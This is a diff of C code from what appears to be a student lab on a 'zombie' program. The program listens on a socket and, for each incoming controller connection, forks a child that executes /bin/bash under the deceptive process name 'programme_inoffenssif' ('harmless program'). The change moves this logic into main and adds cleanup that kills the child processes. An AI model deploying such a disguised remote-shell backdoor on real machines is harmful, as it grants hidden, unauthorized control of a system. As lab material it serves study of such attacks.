@@ -25,20 +25,20 @@ void zombieFils(void* sockfdController){
     sexecl("/bin/bash", "programme_inoffenssif", NULL);
 }
 
-void zombie(char* portRecu){
+int main(int argc, char *argv[]){
     int sockfd;
     int port;
 
     ssigaction(SIGTERM,endZombieLabo);
 
-    if(portRecu==NULL){
+    if(argc < 2){
         sockfd = initSocketZombie(0);
     }else{
-        port = atoi(portRecu);
+        port = atoi(argv[1]);
         sockfd = initSocketZombie(port);
     }
     int i = 0;
-
+    pid_t* pids_chils = malloc(NB_PORTS * sizeof(pid_t));
     int* sockfdController = smalloc(NB_PORTS*sizeof(int));
 
     for (int j = 0; j < NB_PORTS; j++) {
@@ -47,19 +47,19 @@ void zombie(char* portRecu){
     
     while(!end){
         sockfdController[i] = accept(sockfd, NULL, NULL);
-        
         if(sockfdController[i] != -1){
-            fork_and_run1(zombieFils, &sockfdController[i]);
+            pids_chils[i] = fork_and_run1(zombieFils, &sockfdController[i]);
+            //fork_and_run1(zombieFils, &sockfdController[i]);
             i++;
         }else {
             break;
         }
     }
+    for (int i = 0; i < NB_PORTS; i++)
+    {
+        skill(pids_chils[i],SIGTERM);
+    }
+    
 
     free(sockfdController);
-}
-
-int main(int argc, char *argv[]){
-    zombie(argv[1]);
-    return 0;
 }
